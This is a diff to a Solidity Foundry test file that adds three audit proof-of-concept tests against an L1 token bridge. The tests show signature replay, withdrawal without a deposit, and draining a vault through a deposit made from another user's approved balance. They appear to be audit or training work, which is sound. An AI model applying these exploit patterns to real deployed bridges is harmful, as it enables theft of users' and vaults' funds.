@@ -17,6 +17,8 @@ contract L1BossBridgeTest is Test {
     address user = makeAddr("user");
     address userInL2 = makeAddr("userInL2");
     Account operator = makeAccount("operator");
+    address newUser = makeAddr("new user");
+    address newUserL2 = makeAddr("new user L2");
 
     L1Token token;
     L1BossBridge tokenBridge;
@@ -28,6 +30,8 @@ contract L1BossBridgeTest is Test {
         // Deploy token and transfer the user some initial balance
         token = new L1Token();
         token.transfer(address(user), 1000e18);
+        //@note added for replay attack
+        token.transfer(address(newUser), 100e18);
 
         // Deploy bridge
         tokenBridge = new L1BossBridge(IERC20(token));
@@ -222,5 +226,82 @@ contract L1BossBridgeTest is Test {
         returns (uint8 v, bytes32 r, bytes32 s)
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+    }
+
+    //@audit-poc
+    function test_user_attacks_replay_signature() public {
+        vm.startPrank(newUser);
+        uint256 amountToDeposit = 100e18;
+        token.approve(address(tokenBridge), amountToDeposit);
+        tokenBridge.depositTokensToL2(newUser, newUserL2, amountToDeposit);
+        vm.stopPrank();
+        assertEq(token.balanceOf(address(vault)), amountToDeposit);
+
+        vm.startPrank(user);
+        uint256 depositAmount = 10e18;
+        uint256 userInitialBalance = token.balanceOf(address(user));
+
+        token.approve(address(tokenBridge), depositAmount);
+        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
+
+        //total tokens present in vault
+        assertEq(token.balanceOf(address(vault)), depositAmount + amountToDeposit);
+        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);
+
+        //operator is signing the message
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
+        //using the signature to withdraw the tokens
+        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
+
+        //replaying the signature to withdraw the tokens again
+        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
+
+        //user now owns double of the deposit amount
+        assertEq(token.balanceOf(address(user)), userInitialBalance + depositAmount);
+        //valut has lost an extra of depositAmount in the exploit
+        assertEq(token.balanceOf(address(vault)), amountToDeposit - depositAmount);
+    }
+
+    //@audit-poc
+    function test_attack_withdraw_without_deposit() external {
+        vm.startPrank(newUser);
+        uint256 amountToDeposit = 100e18;
+        token.approve(address(tokenBridge), amountToDeposit);
+        tokenBridge.depositTokensToL2(newUser, newUserL2, amountToDeposit);
+        vm.stopPrank();
+        assertEq(token.balanceOf(address(vault)), amountToDeposit);
+
+        //somehow user got the operator to sign the message
+        uint256 amountToWithdraw = 20e18;
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, amountToWithdraw), operator.key);
+        uint256 userInitialBalance = token.balanceOf(user);
+        //user can use this signature to withdraw funds without deposit
+        tokenBridge.withdrawTokensToL1(user, amountToWithdraw, v, r, s);
+
+        assertEq(token.balanceOf(user), userInitialBalance + amountToWithdraw);
+    }
+
+    //@audit-poc
+    function test_depositTokensToL2_called_by_random_address() external {
+        uint256 amountToDeposit = 100e18;
+        vm.prank(newUser);
+        token.approve(address(tokenBridge), amountToDeposit);
+
+        assertEq(token.balanceOf(newUser), amountToDeposit);
+        //attacker has initiated the deposit for a user
+        vm.prank(user);
+        tokenBridge.depositTokensToL2(newUser, newUserL2, amountToDeposit);
+
+        assertEq(token.balanceOf(address(vault)), amountToDeposit);
+        assertEq(token.balanceOf(newUser), 0);
+
+        //attacker then calls the withdraw on behalf of the legit user to steal all their money
+        uint256 amountToWithdraw = amountToDeposit;
+        uint256 userInitialBalance = token.balanceOf(user);
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, amountToWithdraw), operator.key);
+        tokenBridge.withdrawTokensToL1(user, amountToWithdraw, v, r, s);
+
+        assertEq(token.balanceOf(address(vault)), 0);
+        assertEq(token.balanceOf(user), userInitialBalance + amountToDeposit);
     }
 }
